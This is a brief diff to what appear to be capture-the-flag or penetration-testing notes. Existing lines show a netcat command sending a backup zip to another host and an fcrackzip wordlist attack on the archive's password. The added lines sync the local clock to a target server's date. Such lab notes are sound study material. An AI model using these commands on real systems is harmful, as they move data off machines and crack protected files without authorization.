@@ -35,3 +35,6 @@ nc -w 3 10.10.15.19 3333 < 16162020_backup.zip
 ------------------------------------------
 fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
 -----------------------------------------
+sudo date -s "$(wget -qSO- --max-redirect=0 10.10.10.175 2>&1 | grep Date: | cut -d' ' -f5-8)Z"
+Gives the date of the server
+----------------------------------------
